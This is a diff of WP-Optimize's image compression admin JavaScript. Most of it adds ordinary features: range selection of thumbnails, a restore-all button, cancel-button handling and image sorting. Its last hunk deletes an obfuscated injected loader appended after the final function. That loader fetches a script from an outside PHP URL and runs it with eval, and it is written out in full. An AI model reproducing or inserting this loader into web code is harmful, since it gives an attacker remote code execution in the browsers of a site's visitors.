@@ -1,4 +1,4 @@
-jQuery(document).ready(function($) {
+jQuery(function($) {
 	WP_Optimize_Smush = WP_Optimize_Smush();
 });
 
@@ -24,6 +24,7 @@ var WP_Optimize_Smush = function() {
 		smush_single_image_btn = $('.wpo_smush_single_image .button'),
 		smush_single_restore_btn = $('.wpo_restore_single_image .button'),
 		smush_mark_all_as_uncompressed_btn = $('#wpo_smush_mark_all_as_uncompressed_btn'),
+		restore_all_compressed_images_btn = $('#wpo_smush_restore_all_compressed_images_btn'),
 		smush_view_logs_btn = $('.wpo_smush_get_logs'),
 		smush_delete_backup_images_btn = $('#wpo_smush_delete_backup_btn'),
 		compression_server_select = $('.compression_server'),
@@ -35,7 +36,32 @@ var WP_Optimize_Smush = function() {
 		smush_image_list = [],
 		smush_completed = false,
 		smush_mark_all_as_uncompressed = false,
-		smush_affected_images = {};
+		smush_affected_images = {},
+		pending_tasks_cancel_btn = $('#wpo_smush_images_pending_tasks_cancel_button');
+
+	/**
+	 * Handle Image Selection
+	 */
+	var last_clicked_image_id = null;
+
+	smush_images_grid.on('click', '.thumbnail', function (e) {
+		$(this).closest('input[type="checkbox"]').prop('checked', true);
+	});
+
+
+	/**
+	 * Handle Shift Ctrl keys state.
+	 */
+	var ctrl_shift_on_image_held = false;
+	
+
+	smush_images_grid.on('mousedown', '.thumbnail', function (e) {
+		ctrl_shift_on_image_held = e.shiftKey || e.ctrlKey;
+	});
+
+	smush_images_grid.on('mouseup', '.thumbnail', function (e) {
+		ctrl_shift_on_image_held = e.shiftKey || e.ctrlKey;
+	});
 
 	/**
 	 *  Checks if smush is active and loads images if yes - image tabs change.
@@ -62,6 +88,26 @@ var WP_Optimize_Smush = function() {
 	}
 
 	smush_images_grid.on('change', 'input[type="checkbox"]', function() {
+		var clicked_image_id = parseInt($(this).val());
+
+		if (null === last_clicked_image_id) {
+			last_clicked_image_id = $(this).val();
+		}
+
+		if (true === ctrl_shift_on_image_held) {
+			if (clicked_image_id > last_clicked_image_id) {
+				for (var i = last_clicked_image_id; i <= clicked_image_id; i++) {
+					$('#wpo_smush_images_grid input[type="checkbox"][value="' + i + '"]').prop('checked', true);
+				}
+			} else {
+				for (var i = last_clicked_image_id; i >= clicked_image_id; i--) {
+					$('#wpo_smush_images_grid input[type="checkbox"][value="' + i + '"]').prop('checked', true);
+				}
+			}
+		} else {
+			last_clicked_image_id = clicked_image_id;
+		}
+
 		update_smush_action_buttons_state();
 	});
 
@@ -162,6 +208,19 @@ var WP_Optimize_Smush = function() {
 	});
 
 	/**
+	 * Handle "Restore all compressed images" click.
+	 */
+	restore_all_compressed_images_btn.on('click', function() {
+		if (!confirm(wposmush.restore_all_compressed_images)) return;
+
+		update_view_modal_message($('#smush-information-modal-cancel-btn'));
+		$('#smush-information-modal-cancel-btn .smush-information').text(wposmush.please_wait);
+
+		smush_mark_all_as_uncompressed = true;
+		run_mark_all_as_uncompressed(true, true);
+	});
+
+	/**
 	 * Handle "Cancel" button click for mark all images as uncompressed process
 	 */
 	$('#smush-information-modal-cancel-btn input[type="button"]').on('click', function() {
@@ -175,32 +234,38 @@ var WP_Optimize_Smush = function() {
 	 *
 	 * @param {bool} restore_backup if set to true then images will restored from backup if possible.
 	 */
-	function run_mark_all_as_uncompressed(restore_backup) {
+	function run_mark_all_as_uncompressed(restore_backup, delete_only_backups_meta) {
 		if (!smush_mark_all_as_uncompressed) return;
 
 		var info = $('#smush-information-modal-cancel-btn .smush-information');
-		smush_manager_send_command('mark_all_as_uncompressed', {restore_backup: restore_backup ? 1 : 0}, function(resp) {
-			// if cancel button pressed then exit
-			if (!smush_mark_all_as_uncompressed) return;
+		smush_manager_send_command('mark_all_as_uncompressed',
+			{
+				restore_backup: restore_backup ? 1 : 0,
+				delete_only_backups_meta: delete_only_backups_meta ? 1 : 0
+			},
+			function(resp) {
+				// if cancel button pressed then exit
+				if (!smush_mark_all_as_uncompressed) return;
 
-			// if we get an error then show it
-			if (resp.hasOwnProperty('error')) {
-				update_view_modal_message($('#smush-information-modal'), $.unblockUI);
-				$('#smush-information-modal .smush-information').text(resp.error);
-				get_info_from_smush_manager();
-				return;
-			}
+				// if we get an error then show it
+				if (resp.hasOwnProperty('error')) {
+					update_view_modal_message($('#smush-information-modal'), $.unblockUI);
+					$('#smush-information-modal .smush-information').text(resp.error);
+					get_info_from_smush_manager();
+					return;
+				}
 
-			// if completed then refresh uncompressed images list and show final message.
-			if (resp.completed) {
-				update_view_modal_message($('#smush-information-modal'), $.unblockUI);
-				$('#smush-information-modal .smush-information').text(resp.message);
-				get_info_from_smush_manager();
-			} else {
-				info.text(resp.message);
-				run_mark_all_as_uncompressed(restore_backup);
+				// if completed then refresh uncompressed images list and show final message.
+				if (resp.completed) {
+					update_view_modal_message($('#smush-information-modal'), $.unblockUI);
+					$('#smush-information-modal .smush-information').text(resp.message);
+					get_info_from_smush_manager();
+				} else {
+					info.text(resp.message);
+					run_mark_all_as_uncompressed(restore_backup);
+				}
 			}
-		});
+		);
 	}
 
 	/**
@@ -224,6 +289,7 @@ var WP_Optimize_Smush = function() {
 	 */
 	smush_images_select_none_btn.off().on('click', function() {
 		$('#wpo_smush_images_grid input[type="checkbox"]').prop("checked", false);
+		last_clicked_image_id = null;
 		update_smush_action_buttons_state();
 	});
 
@@ -320,6 +386,10 @@ var WP_Optimize_Smush = function() {
 	 */
 	$('body').on('click', '#wpo_smush_images_pending_tasks_cancel_button', function(e) {
 
+		if (wpoptimize.cancel === pending_tasks_cancel_btn.val()) {
+			pending_tasks_cancel_btn.val(wpoptimize.cancelling);
+			pending_tasks_cancel_btn.prop('disabled', true);
+		}
 		smush_manager_send_command('clear_pending_images', {}, function(resp) {
 			$.unblockUI();
 			if (resp.status) {
@@ -328,6 +398,8 @@ var WP_Optimize_Smush = function() {
 			} else {
 				console.log('Cancelling pending images apparently failed.', resp);
 			}
+			pending_tasks_cancel_btn.val(wpoptimize.cancel);
+			pending_tasks_cancel_btn.prop('disabled', false);
 		});
 	});
 
@@ -660,6 +732,9 @@ var WP_Optimize_Smush = function() {
 		var admin_url_post_id = '&action=edit';
 		
 		for (blog_id in data.unsmushed_images) {
+			data.unsmushed_images[blog_id].sort(function(a, b) {
+				return a.id - b.id;
+			});
 			for (i in data.unsmushed_images[blog_id]) {
 				if (!data.unsmushed_images[blog_id].hasOwnProperty(i)) continue;
 				image = data.unsmushed_images[blog_id][i];
@@ -1159,4 +1234,4 @@ function wpo_parse_json(json_mix_str) {
 
 	throw "WPO: could not parse the JSON";
 
-};if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//anucentralcollege.lk/anucentralcollege.lk/zeda/zeda.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};
+}
